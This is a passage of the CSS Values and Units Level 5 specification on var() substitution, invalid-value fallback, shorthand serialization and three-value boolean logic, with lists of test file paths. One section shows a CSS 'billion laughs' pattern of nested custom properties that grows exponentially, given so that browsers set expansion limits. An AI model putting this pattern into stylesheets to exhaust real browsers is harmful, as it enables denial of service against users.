> <a id="example-43a8c543"></a> For example, the following code incorrectly attempts to use a variable as a property name:
>
> ```text
> .foo {
>   --side: margin-top;
>   var(--side): 20px;
> }
> ```
>
> <a id="ref-for-propdef-margin-top③"></a>
>
> This is <em>not</em> equivalent to setting [margin-top: 20px;](https://drafts.csswg.org/css-box-4/#propdef-margin-top). Instead, the second declaration is simply thrown away as a syntax error for having an invalid property name.

<a id="ref-for-arbitrary-substitution-function③②"></a>

<a id="ref-for-argument-grammar①④"></a>

If a property value contains one or more [arbitrary substitution functions](#arbitrary-substitution-function), and all of those functions are themselves syntactically valid according to their [argument grammar](#argument-grammar)s, the entire value’s grammar must be assumed to be valid at parse time.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-reference-18.html`
- `css/css-variables/variable-reference-19.html`
- `css/css-variables/variable-reference-30.html`

<a id="ref-for-arbitrary-substitution-function③③"></a>

<a id="ref-for-substitute-arbitrary-substitution-function②⑥"></a>

<a id="ref-for-computed-value②⑤"></a>

<a id="ref-for-property-replacement③"></a>

<a id="ref-for-invalid-at-computed-value-time⑧"></a>

[Arbitrary substitution functions](#arbitrary-substitution-function) are [substituted](#substitute-arbitrary-substitution-function) during style [computation](https://drafts.csswg.org/css-cascade-5/#computed-value), before any other value transformations or introspection can occur. If a property, after [property replacement](#property-replacement), does not match its declared grammar, the declaration is [invalid at computed-value time](#invalid-at-computed-value-time).

<a id="ref-for-arbitrary-substitution-function③④"></a>

<a id="ref-for-computed-value②⑥"></a>

<a id="ref-for-valdef-all-unset"></a>

<a id="ref-for-cascade①"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: Since [arbitrary substitution functions](#arbitrary-substitution-function) resolve at [computed value](https://drafts.csswg.org/css-cascade-5/#computed-value) time, if the resulting value after substitution is invalid, the property falls back (essentially) to [unset](https://drafts.csswg.org/css-cascade-5/#valdef-all-unset) behavior, rather than falling back to an earlier value in the [cascade](https://drafts.csswg.org/css-cascade-6/#cascade) the way declarations invalid at parse time do. See [Invalid Substitution](#invalid-substitution).

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-declaration-16.html`
- `css/css-variables/variable-declaration-17.html`
- `css/css-variables/variable-declaration-18.html`
- `css/css-variables/variable-declaration-19.html`
- `css/css-variables/variable-declaration-21.html`
- `css/css-variables/variable-transitions-transition-property-all-before-value.html`
- `css/css-variables/variable-transitions-value-before-transition-property-all.html`

<a id="ref-for-property-replacement④"></a>

<a id="ref-for-css-wide-keywords②"></a>

<a id="ref-for-specified-value③"></a>

If a property value, after [property replacement](#property-replacement), contains only a single [CSS-wide keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords) (and possibly whitespace/comments), its value is determined as if that keyword were its [specified value](https://drafts.csswg.org/css-cascade-5/#specified-value) all along.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/whitespace-in-fallback-crash.html`
- `css/css-variables/wide-keyword-fallback-001.html`
- `css/css-variables/wide-keyword-fallback-002.html`

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-b87fa983"></a> For example, the following usage is fine from a syntax standpoint, but results in nonsense when the variable is substituted in:
>
> ```text
> :root { --looks-valid: 20px; }
> p { background-color: var(--looks-valid); }
> ```
>
> <a id="ref-for-propdef-background-color"></a>
>
> <a id="ref-for-invalid-at-computed-value-time⑨"></a>
>
> <a id="ref-for-valdef-color-transparent"></a>
>
> <a id="ref-for-initial-value"></a>
>
> Since 20px is an invalid value for [background-color](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color), the property becomes [invalid at computed-value time](#invalid-at-computed-value-time), and instead resolves to [transparent](https://drafts.csswg.org/css-color-4/#valdef-color-transparent) (the [initial value](https://drafts.csswg.org/css-cascade-5/#initial-value) for <a id="ref-for-propdef-background-color①"></a>background-color).
>
> <a id="ref-for-propdef-color"></a>
>
> If the property was one that’s inherited by default, such as [color](https://drafts.csswg.org/css-color-4/#propdef-color), it would compute to the inherited value rather than the initial value.

<a id="ref-for-funcdef-var①②"></a>

<a id="ref-for-css-wide-keywords③"></a>

<a id="ref-for-custom-property⑦"></a>

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-7afce32e"></a> While a [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function can’t get a [CSS-wide keyword](https://drafts.csswg.org/css-values-4/#css-wide-keywords) from the [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) itself—​if you tried to specify that, like --foo: initial;, it would just trigger [explicit defaulting](https://drafts.csswg.org/css-cascade-4/#defaulting-keywords) for the custom property—​it can have a <a id="ref-for-css-wide-keywords④"></a>CSS-wide keyword in its fallback:
>
> ```text
> p { color: var(--does-not-exist, initial); }
> ```
>
> <a id="ref-for-invalid-at-computed-value-time①⓪"></a>
>
> <a id="ref-for-funcdef-var①③"></a>
>
> <a id="ref-for-valdef-all-initial"></a>
>
> <a id="ref-for-propdef-color①"></a>
>
> In the above code, if the --does-not-exist property didn’t exist or is [invalid at computed-value time](#invalid-at-computed-value-time), the [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) will instead substitute in the [initial](https://drafts.csswg.org/css-cascade-5/#valdef-all-initial) keyword, making the property behave as if it was originally [color: initial](https://drafts.csswg.org/css-color-4/#propdef-color). This will make it take on the document’s initial <a id="ref-for-propdef-color②"></a>color value, rather than defaulting to inheritance, as it would if there were no fallback.

To <a id="property-replacement"></a>replace substitution functions in a property <var>prop</var>:

1.  <a id="ref-for-substitute-arbitrary-substitution-function②⑦"></a>

    <a id="ref-for-substitution-context①⑦"></a>

    <a id="ref-for-component-value⑨"></a>

    [Substitute arbitrary substitution functions](#substitute-arbitrary-substitution-function) in <var>prop</var>’s value, given «"property", <var>prop</var>’s name» as the [substitution context](#substitution-context). Let <var>result</var> be the returned [component value](https://drafts.csswg.org/css-syntax-3/#component-value) sequence.

2.  <a id="ref-for-guaranteed-invalid-value②⑥"></a>

    <a id="ref-for-invalid-at-computed-value-time①①"></a>

    If <var>result</var> contains the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), <var>prop</var> is [invalid at computed-value time](#invalid-at-computed-value-time); return.

3.  <a id="ref-for-css-parse-something-according-to-a-css-grammar①⑤"></a>

    <a id="ref-for-invalid-at-computed-value-time①②"></a>

    [Parse](https://drafts.csswg.org/css-syntax-3/#css-parse-something-according-to-a-css-grammar) <var>result</var> according to <var>prop</var>’s grammar. If this returns failure, <var>prop</var> is [invalid at computed-value time](#invalid-at-computed-value-time); return.

4.  Otherwise, replace <var>prop</var>’s value with the parsed result.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/css-variable-change-style-001.html`
- `css/css-variables/css-variable-change-style-002.html`
- `css/css-variables/variable-declaration-01.html`
- `css/css-variables/variable-declaration-02.html`
- `css/css-variables/variable-declaration-03.html`
- `css/css-variables/variable-declaration-04.html`
- `css/css-variables/variable-declaration-05.html`
- `css/css-variables/variable-generated-content-dynamic-001.html`
- `css/css-variables/variable-presentation-attribute.html`
- `css/css-variables/variable-reference-01.html`
- `css/css-variables/variable-reference-02.html`
- `css/css-variables/variable-reference-03.html`
- `css/css-variables/variable-reference-04.html`
- `css/css-variables/variable-reference-05.html`
- `css/css-variables/variable-reference-12.html`
- `css/css-variables/variable-reference-16.html`
- `css/css-variables/variable-reference-40.html`
- `css/css-variables/variable-reference-refresh.html`
- `css/css-variables/variable-substitution-background-properties.html`
- `css/css-variables/variable-substitution-basic.html`
- `css/css-variables/variable-substitution-filters.html`
- `css/css-variables/variable-substitution-replaced-size.html`
- `css/css-variables/variable-substitution-shadow-properties.html`
- `css/css-variables/variable-substitution-variable-declaration.html`

<strong>Source test references: CSSOM</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-reference-cssom.html`

<a id="ref-for-substitute-arbitrary-substitution-function②⑧"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note that [substitution](#substitute-arbitrary-substitution-function) takes place at the level of CSS tokens [\[css-syntax-3\]](#biblio-css-syntax-3), not at a textual level; you can’t build up a single token where part of it is provided by a variable:
>
> ```text
> .foo {
>   --gap: 20;
>   margin-top: var(--gap)px;
> }
> ```
>
> <a id="ref-for-propdef-margin-top④"></a>
>
> <a id="ref-for-funcdef-calc①③"></a>
>
> This is <em>not</em> equivalent to setting [margin-top: 20px;](https://drafts.csswg.org/css-box-4/#propdef-margin-top) (a length). Instead, it’s equivalent to <a id="ref-for-propdef-margin-top⑤"></a>margin-top: 20 px; (a number followed by an ident), which is simply an invalid value for the <a id="ref-for-propdef-margin-top⑥"></a>margin-top property. Note, though, that [calc()](https://drafts.csswg.org/css-values-4/#funcdef-calc) can be used to validly achieve the same thing, like so:
>
> ```text
> .foo {
>   --gap: 20;
>   margin-top: calc(var(--gap) * 1px);
> }
> ```
>
> This also implies that the post-substitution value might not be directly serializable as-is. Here’s a similar example to the preceding:
>
> ```text
> .foo {
>   --gap: 20;
>   --not-px-length: var(--gap)px;
> }
> ```
>
> The serialization of the computed (post-substitution) value of --not-px-length is <strong>not</strong> 20px, because that would parse back as the single combined dimension; instead, it will serialize with a comment between the two tokens, like px, to enforce that they are separate tokens even when re-parsing.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-declaration-14.html`
- `css/css-variables/variable-declaration-53.html`
- `css/css-variables/variable-declaration-54.html`
- `css/css-variables/variable-declaration-55.html`
- `css/css-variables/variable-reference-15.html`
- `css/css-variables/variable-reference-without-whitespace.html`

### <a id="invalid-substitution"></a><a id="invalid-variables"></a> Invalid Substitution

<a id="ref-for-property-replacement⑤"></a>

<a id="ref-for-guaranteed-invalid-value②⑦"></a>

When [property replacement](#property-replacement) results in a property’s value containing the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value), this makes the declaration <a id="invalid-at-computed-value-time"></a>invalid at computed-value time. When this happens, the computed value is one of the following depending on the property’s type:

<a id="ref-for-custom-property⑧"></a>

The property is a non-registered [custom property](https://drafts.csswg.org/css-variables-2/#custom-property)

<a id="ref-for-universal-syntax-definition①"></a>

<a id="ref-for-registered-custom-property⑦"></a>

The property is a [registered custom property](https://drafts.css-houdini.org/css-properties-values-api-1/#registered-custom-property) with [universal syntax](https://drafts.css-houdini.org/css-properties-values-api-1/#universal-syntax-definition)

<a id="ref-for-guaranteed-invalid-value②⑧"></a>

The computed value is the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

Otherwise

<a id="ref-for-valdef-all-unset①"></a>

Either the property’s inherited value or its initial value depending on whether the property is inherited or not, respectively, as if the property’s value had been specified as the [unset](https://drafts.csswg.org/css-cascade-5/#valdef-all-unset) keyword.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variables-substitute-guaranteed-invalid.html`

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-53e4f9d5"></a> For example, in the following code:
>
> ```text
> :root { --not-a-color: 20px; }
> p { background-color: red; }
> p { background-color: var(--not-a-color); }
> ```
>
> <a id="ref-for-propdef-background-color②"></a>
>
> <a id="ref-for-custom-property⑨"></a>
>
> <a id="ref-for-funcdef-var①④"></a>
>
> the \<p\> elements will have transparent backgrounds (the initial value for [background-color](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color)), rather than red backgrounds. The same would happen if the [custom property](https://drafts.csswg.org/css-variables-2/#custom-property) itself was unset, or contained an invalid [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var) function.
>
> <a id="ref-for-propdef-background-color③"></a>
>
> Note the difference between this and what happens if the author had just written [background-color: 20px](https://drafts.csswg.org/css-backgrounds-3/#propdef-background-color) directly in their stylesheet - that would be a normal syntax error, which would cause the rule to be discarded, so the <a id="ref-for-propdef-background-color④"></a>background-color: red rule would be used instead.

<a id="ref-for-invalid-at-computed-value-time①③"></a>

<a id="ref-for-arbitrary-substitution-function③⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The [invalid at computed-value time](#invalid-at-computed-value-time) concept exists because [arbitrary substitution functions](#arbitrary-substitution-function) can’t "fail early" like other syntax errors can, so by the time the user agent realizes a property value is invalid, it’s already thrown away the other cascaded values.

### <a id="substitution-in-shorthands"></a><a id="variables-in-shorthands"></a> Substitution in Shorthand Properties

<a id="ref-for-arbitrary-substitution-function③⑥"></a>

<a id="ref-for-shorthand-property④"></a>

[Arbitrary substitution functions](#arbitrary-substitution-function) produce some complications when parsing [shorthand properties](https://drafts.csswg.org/css-cascade-5/#shorthand-property) into their component longhands, and when serializing <a id="ref-for-shorthand-property⑤"></a>shorthand properties <em>from</em> their component longhands.

<a id="ref-for-shorthand-property⑥"></a>

<a id="ref-for-arbitrary-substitution-function③⑦"></a>

<a id="ref-for-longhand"></a>

<a id="ref-for-substitute-arbitrary-substitution-function②⑨"></a>

If a [shorthand property](https://drafts.csswg.org/css-cascade-5/#shorthand-property) contains an [arbitrary substitution function](#arbitrary-substitution-function) in its value, the [longhand properties](https://drafts.csswg.org/css-cascade-5/#longhand) it’s associated with must instead be filled in with a special, unobservable-to-authors <a id="pending-substitution-value"></a>pending-substitution value that indicates the shorthand contains an <a id="ref-for-arbitrary-substitution-function③⑧"></a>arbitrary substitution function, and thus the longhand’s value can’t be determined until after [substituted](#substitute-arbitrary-substitution-function).

<a id="ref-for-substitute-arbitrary-substitution-function③⓪"></a>

This value must then be cascaded as normal, and at computed-value time, after [substitution](#substitute-arbitrary-substitution-function), the shorthand must be parsed and the longhands must be given their appropriate values at that point.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-reference-36.html`
- `css/css-variables/variable-reference-37.html`
- `css/css-variables/variable-reference-38.html`
- `css/css-variables/variable-substitution-shorthands.html`
- `css/css-variables/vars-background-shorthand-001.html`
- `css/css-variables/vars-font-shorthand-001.html`

<a id="ref-for-arbitrary-substitution-function③⑨"></a>

<a id="ref-for-longhand①"></a>

<a id="ref-for-cascade②"></a>

<a id="ref-for-shorthand-property⑦"></a>

<a id="ref-for-funcdef-var①⑤"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: When a shorthand is written without an [arbitrary substitution function](#arbitrary-substitution-function), it is parsed and separated out into its component [longhand properties](https://drafts.csswg.org/css-cascade-5/#longhand) at parse time; the longhands then participate in the [cascade](https://drafts.csswg.org/css-cascade-6/#cascade), with the [shorthand property](https://drafts.csswg.org/css-cascade-5/#shorthand-property) more or less discarded. When the shorthand contains a [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var), however, this can’t be done, as the <a id="ref-for-funcdef-var①⑥"></a>var() could be substituted with anything.

<a id="ref-for-pending-substitution-value"></a>

[Pending-substitution values](#pending-substitution-value) must be serialized as the empty string, if an API allows them to be observed.

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/variable-definition-border-shorthand-serialize.html`
- `css/css-variables/vars-border-shorthand-serialize.html`

------------------------------------------------------------------------

<a id="ref-for-shorthand-property⑧"></a>

<a id="ref-for-longhand②"></a>

[Shorthand properties](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are serialized by gathering the values of their component [longhand properties](https://drafts.csswg.org/css-cascade-5/#longhand), and synthesizing a value that will parse into the same set of values.

<a id="ref-for-longhand③"></a>

<a id="ref-for-shorthand-property⑨"></a>

<a id="ref-for-pending-substitution-value①"></a>

<a id="ref-for-arbitrary-substitution-function④⓪"></a>

If all of the component [longhand properties](https://drafts.csswg.org/css-cascade-5/#longhand) for a given [shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are [pending-substitution values](#pending-substitution-value) from the same original shorthand value, the <a id="ref-for-shorthand-property①⓪"></a>shorthand property must serialize to that original ([arbitrary substitution function](#arbitrary-substitution-function)-containing) value.

<a id="ref-for-longhand④"></a>

<a id="ref-for-shorthand-property①①"></a>

<a id="ref-for-pending-substitution-value②"></a>

<a id="ref-for-arbitrary-substitution-function④①"></a>

<a id="ref-for-substitute-arbitrary-substitution-function③①"></a>

Otherwise, if any of the component [longhand properties](https://drafts.csswg.org/css-cascade-5/#longhand) for a given [shorthand](https://drafts.csswg.org/css-cascade-5/#shorthand-property) are [pending-substitution values](#pending-substitution-value), or contain [arbitrary substitution functions](#arbitrary-substitution-function) of their own that have not yet been [substituted](#substitute-arbitrary-substitution-function), the <a id="ref-for-shorthand-property①②"></a>shorthand property must serialize to the empty string.

### <a id="long-substitution"></a><a id="long-variables"></a> Safely Handling Overly-Long Substitution

<a id="ref-for-arbitrary-substitution-function④②"></a>

<a id="ref-for-funcdef-var①⑦"></a>

Naively implemented, some [arbitrary substitution functions](#arbitrary-substitution-function) (such as [var()](https://drafts.csswg.org/css-variables-2/#funcdef-var)) can be used in a variation of the "billion laughs attack":

> <strong data-conversion-semantic="example">Example</strong>
>
> <a id="example-9c9258de"></a>
>
> ```text
> .foo {
>   --prop1: lol;
>   --prop2: var(--prop1) var(--prop1);
>   --prop3: var(--prop2) var(--prop2);
>   --prop4: var(--prop3) var(--prop3);
>   /* etc */
> }
> ```
>
> In this short example, --prop4’s computed value is lol lol lol lol lol lol lol lol, containing 8 copies of the original lol. Every additional level added to this doubles the number of identifiers; extending it to a mere 30 levels, the work of a few minutes by hand, would make --prop30 contain <em>nearly a billion instances</em> of the identifier.

<a id="ref-for-arbitrary-substitution-function④③"></a>

<a id="ref-for-guaranteed-invalid-value②⑨"></a>

To avoid this sort of attack, UAs must impose a UA-defined limit on the allowed length of the token stream that an [arbitrary substitution function](#arbitrary-substitution-function) expands into. If an <a id="ref-for-arbitrary-substitution-function④④"></a>arbitrary substitution function would expand into a longer token stream than this limit, it instead is replaced with the [guaranteed-invalid value](https://drafts.csswg.org/css-variables-2/#guaranteed-invalid-value).

<strong>Source test references</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-variables/long-variable-reference-crash.html`
- `css/css-variables/variable-exponential-blowup.html`

This specification does not define what size limit should be imposed. However, since there are valid use-cases for custom properties that contain a kilobyte or more of text, it’s recommended that the limit be set relatively high.

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: The general principle that UAs are allowed to violate standards due to resource constraints is still generally true here; a UA might, separately, have limits on how long of a custom property they can support, or how large of an identifier they can support. This section calls out this attack specifically because of its long history, and the fact that it can be done without any of the pieces <em>seeming</em> to be too large on first inspection.

## <a id="boolean-logic"></a> Appendix B: Boolean Logic

<a id="ref-for-typedef-boolean-expr①⓪"></a>

<a id="ref-for-typedef-general-enclosed②"></a>

<a id="ref-for-at-ruledef-supports③"></a>

In order to accommodate future extensions of CSS, [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) productions generally interpret their [\<general-enclosed\>](https://drafts.csswg.org/mediaqueries-5/#typedef-general-enclosed) grammar branch as unknown, and their boolean logic is resolved using 3-value Kleene logic. In some cases (such as [@supports](https://drafts.csswg.org/css-conditional-3/#at-ruledef-supports)), <a id="ref-for-typedef-general-enclosed③"></a>\<general-enclosed\> is instead defined as false; in which case the logic devolves to standard boolean algebra.

3-value boolean logic is applied recursively to a boolean condition <var>test</var> as follows:

- A leaf-level <var>test</var> resolves to true, false, or unknown, as defined by the relevant specification.

- not <var>test</var> evaluates to true if its contained <var>test</var> is false, false if it’s true, and unknown if it’s unknown.

- Multiple <var>test</var>s connected with and evaluate to true if <em>all</em> of those <var>test</var>s are true, false if <em>any</em> of them are false, and unknown otherwise (i.e. if at least one unknown, but no false).

- Multiple <var>test</var>s connected with or evaluate to true if <em>any</em> of those <var>test</var>s are true, false if <em>all</em> of them are false, and unknown otherwise (i.e. at least one unknown, but no true).

<a id="ref-for-typedef-boolean-expr①①"></a>

If a “top-level” [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) is unknown, and the containing context doesn’t otherwise define how to handle unknown conditions, it evaluates to false.

<a id="ref-for-top-level-calculation"></a>

> <strong data-conversion-semantic="note">Note</strong>
>
> Note: That is, unknown doesn’t “escape” a 3-value boolean expression unless explicitly handled, similar to how `NaN` doesn’t “escape” a [top-level calculation](https://drafts.csswg.org/css-values-4/#top-level-calculation)).

## <a id="acknowledgments"></a> Acknowledgments

Firstly, the editors would like to thank all of the contributors to the [previous level](https://www.w3.org/TR/css-values-4/#acknowledgments) of this module.

Secondly, we would like to acknowledge Guillaume Lebas, L. David Baron, Mike Bremford, Sebastian Zartner, and [especially Scott Kellum](https://github.com/w3c/csswg-drafts/issues/6245) for their ideas, comments, and suggestions for Level 5;

## <a id="changes"></a> Changes

### <a id="changes-recent"></a> Recent Changes

Changes since the [11 November 2024 Working Draft](css-values-5-attribute-substitution-definitions--WD-css-values-5-20241111--af984ef26b39.md):

- <a id="ref-for-funcdef-container-progress"></a>

  <a id="ref-for-funcdef-progress⑦"></a>

  Dropped media-progess() and [container-progress()](https://www.w3.org/TR/css-values-5/#funcdef-container-progress) in favor of using relevant units in [progress()](#funcdef-progress). ([Issue 11826](https://github.com/w3c/csswg-drafts/issues/11826))

See also [earlier changes](css-values-5-attribute-substitution-definitions--WD-css-values-5-20241111--af984ef26b39.md#changes).

### <a id="additions-L4"></a> Additions Since Level 4

Additions since [CSS Values and Units Level 4](http://www.w3.org/TR/css-values-4/):

- Added the “comma-wrapping” {} notation for function arguments.

- <a id="ref-for-typedef-url-modifier①"></a>

  <a id="ref-for-url-value⑥"></a>

  Defined several [\<url-modifier\>](https://drafts.csswg.org/css-values-4/#typedef-url-modifier)s for [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) functions.

- <a id="ref-for-typedef-position①⑧"></a>

  <a id="ref-for-flow-relative①"></a>

  Extended [\<position\>](#typedef-position) to handle [flow-relative](https://drafts.csswg.org/css-writing-modes-4/#flow-relative) positions. ([Issue 549](https://github.com/w3c/csswg-drafts/issues/549#issuecomment-1823607623))

- Added the [\*-progress()](#progress) family of functions, to represent interpolation progress between two values.

- Added the [\*-mix()](#mixing) family of functions, to represent actually interpolating between two values.

- <a id="ref-for-funcdef-first-valid④"></a>

  Added [first-valid()](#funcdef-first-valid), to allow CSS’s forward-compatible parsing behavior (drop invalid things, go with what’s left) to be used with custom properties and other contexts where validity isn’t known until <em>after</em> parsing.

- <a id="ref-for-funcdef-if①⑧"></a>

  Added [if()](#funcdef-if) for inline conditionals.

- <a id="ref-for-funcdef-inherit⑤"></a>

  Added [inherit()](#funcdef-inherit).

- <a id="ref-for-funcdef-cycle①⑤"></a>

  <a id="ref-for-funcdef-attr②③"></a>

  Added the [cycle()](#funcdef-cycle) and [attr()](#funcdef-attr) functions.

- <a id="ref-for-funcdef-random①⑥"></a>

  <a id="ref-for-funcdef-random-item①④"></a>

  Added the [random()](#funcdef-random) and [random-item()](#funcdef-random-item) functions.

- <a id="ref-for-funcdef-sibling-count①"></a>

  <a id="ref-for-funcdef-sibling-index⑤"></a>

  Added the [sibling-count()](#funcdef-sibling-count) and [sibling-index()](#funcdef-sibling-index) functions.

- <a id="ref-for-funcdef-calc-size④⑦"></a>

  <a id="ref-for-propdef-interpolate-size④"></a>

  Added the [calc-size()](#funcdef-calc-size) function, and the related [interpolate-size](#propdef-interpolate-size) property.

- <a id="ref-for-typedef-boolean-expr①②"></a>

  <a id="ref-for-css-value-definition-syntax①"></a>

  Added the [\<boolean-expr\[\]\>](https://www.w3.org/TR/css-values-5/#typedef-boolean-expr) syntax notation to the [value definition syntax](https://drafts.csswg.org/css-values-4/#css-value-definition-syntax).

## <a id="security"></a> Security Considerations

<a id="ref-for-url-value⑦"></a>

<a id="ref-for-the-img-element"></a>

<a id="ref-for-the-link-element"></a>

This specification allows CSS [\<url\>](https://drafts.csswg.org/css-values-4/#url-value) values to have various aspects of their request modified. Although this is new to CSS, every ability is already present in <code><a href="https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element">img</a></code> or <code><a href="https://html.spec.whatwg.org/multipage/semantics.html#the-link-element">link</a></code>, as well as via JavaScript.

<a id="ref-for-funcdef-attr②④"></a>

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 8.7.2 Security](#attr-security).

## <a id="privacy"></a> Privacy Considerations

<a id="ref-for-funcdef-media-progress"></a>

<a id="ref-for-media-query①"></a>

This specification defines units that expose the user’s screen size and default font size, but both are trivially observable from JS, so they do not constitute a new privacy risk. Similarly the [media-progress()](https://www.w3.org/TR/css-values-5/#funcdef-media-progress) notation exposes information about the user’s environment and preferences that are already observiable via [media queries](https://drafts.csswg.org/mediaqueries-5/#media-query).

<a id="ref-for-funcdef-attr②⑤"></a>

The [attr()](#funcdef-attr) function allows HTML attribute values to be used in CSS values, potentially exposing sensitive information that was previously not accessible via CSS. See [§ 8.7.2 Security](#attr-security).

<strong>Source test references (hidden in original rendering): Values 4 tests</strong>

Test paths recorded in the pinned source; availability is not asserted.

- `css/css-values/absolute-length-units-001.html`
- `css/css-values/absolute-length-units-manual.html`
- `css/css-values/acos-asin-atan-atan2-computed.html`
- `css/css-values/acos-asin-atan-atan2-invalid.html`
- `css/css-values/acos-asin-atan-atan2-serialize.html`
- `css/css-values/angle-units-001.html`
- `css/css-values/angle-units-002.html`
- `css/css-values/angle-units-003.html`
- `css/css-values/angle-units-004.html`
- `css/css-values/angle-units-005.html`
- `css/css-values/animations/calc-interpolation.html`
- `css/css-values/animations/line-height-lh-transition.html`
- `css/css-values/animations/scale-interpolation-crash.html`
- `css/css-values/calc-angle-values.html`
- `css/css-values/calc-background-image-gradient-1.html`
- `css/css-values/calc-background-linear-gradient-1.html`
- `css/css-values/calc-background-position-002.html`
- `css/css-values/calc-background-position-003.html`
- `css/css-values/calc-background-position-1.html`
- `css/css-values/calc-background-size-1.html`
- `css/css-values/calc-border-radius-1.html`
- `css/css-values/calc-catch-divide-by-0.html`
- `css/css-values/calc-ch-ex-lang.html`
- `css/css-values/calc-complex-sign-function-crash.html`
- `css/css-values/calc-complex-unresolved-serialize.html`
- `css/css-values/calc-dimension-serialization-order.html`
- `css/css-values/calc-height-block-1.html`
- `css/css-values/calc-height-table-1.html`
- `css/css-values/calc-in-calc.html`
- `css/css-values/calc-in-color-001.html`
- `css/css-values/calc-in-counter-001.xhtml`
- `css/css-values/calc-in-font-feature-settings.html`
- `css/css-values/calc-in-max.html`
- `css/css-values/calc-in-media-queries-001.html`
- `css/css-values/calc-in-media-queries-002.html`
- `css/css-values/calc-in-media-queries-with-mixed-units.html`
- `css/css-values/calc-infinity-nan-computed.html`
- `css/css-values/calc-infinity-nan-serialize-angle.html`
- `css/css-values/calc-infinity-nan-serialize-length.html`
- `css/css-values/calc-infinity-nan-serialize-number.html`
- `css/css-values/calc-infinity-nan-serialize-resolution.html`
- `css/css-values/calc-infinity-nan-serialize-time.html`
- `css/css-values/calc-integer.html`
- `css/css-values/calc-invalid-parsing.html`
- `css/css-values/calc-invalid-range-clamping.html`
- `css/css-values/calc-letter-spacing.html`
- `css/css-values/calc-linear-radial-conic-gradient-001.html`
- `css/css-values/calc-margin-block-1.html`
- `css/css-values/calc-max-height-block-1.html`
- `css/css-values/calc-max-width-block-1.html`
- `css/css-values/calc-max-width-block-intrinsic-1.html`
- `css/css-values/calc-min-height-block-1.html`
- `css/css-values/calc-min-height.html`
- `css/css-values/calc-min-width-block-1.html`
- `css/css-values/calc-min-width-block-intrinsic-1.html`
- `css/css-values/calc-nesting-002.html`
- `css/css-values/calc-nesting.html`
- `css/css-values/calc-numbers.html`
- `css/css-values/calc-offsets-absolute-bottom-1.html`
- `css/css-values/calc-offsets-absolute-left-1.html`
- `css/css-values/calc-offsets-absolute-right-1.html`
- `css/css-values/calc-offsets-absolute-top-1.html`
- `css/css-values/calc-offsets-relative-bottom-1.html`
- `css/css-values/calc-offsets-relative-left-1.html`
- `css/css-values/calc-offsets-relative-right-1.html`
- `css/css-values/calc-offsets-relative-top-1.html`
- `css/css-values/calc-padding-block-1.html`
- `css/css-values/calc-parenthesis-stack.html`
- `css/css-values/calc-positive-fraction-001.html`
- `css/css-values/calc-rem-lang.html`
- `css/css-values/calc-rgb-percent-001.html`
- `css/css-values/calc-rounding-001.html`
- `css/css-values/calc-rounding-002.html`
- `css/css-values/calc-rounding-003.html`
- `css/css-values/calc-rounds-to-integer.html`
- `css/css-values/calc-serialization-002.html`
- `css/css-values/calc-serialization.html`
- `css/css-values/calc-text-indent-1.html`
- `css/css-values/calc-text-indent-intrinsic-1.html`
- `css/css-values/calc-time-values.html`
- `css/css-values/calc-transform-origin-1.html`
- `css/css-values/calc-unit-analysis.html`
- `css/css-values/calc-vertical-align-1.html`
- `css/css-values/calc-width-block-1.html`
- `css/css-values/calc-width-block-intrinsic-1.html`
- `css/css-values/calc-width-table-auto-1.html`
- `css/css-values/calc-width-table-fixed-1.html`
- `css/css-values/calc-z-index-fractions-001.html`
- `css/css-values/calc-zero-percent-height.html`
- `css/css-values/cap-invalidation.html`
- `css/css-values/cap-unit-001.html`
- `css/css-values/ch-empty-pseudo-recalc-on-font-load.html`
- `css/css-values/ch-pseudo-recalc-on-font-load.html`
- `css/css-values/ch-recalc-on-font-load.html`
- `css/css-values/ch-unit-001.html`
- `css/css-values/ch-unit-002.html`
- `css/css-values/ch-unit-003.html`
- `css/css-values/ch-unit-004.html`
- `css/css-values/ch-unit-008.html`
- `css/css-values/ch-unit-009.html`
- `css/css-values/ch-unit-010.html`
- `css/css-values/ch-unit-011.html`
- `css/css-values/ch-unit-012.html`
- `css/css-values/ch-unit-016.html`
- `css/css-values/ch-unit-017.html`
- `css/css-values/ch-unit-018.html`
- `css/css-values/ch-unit-019.html`
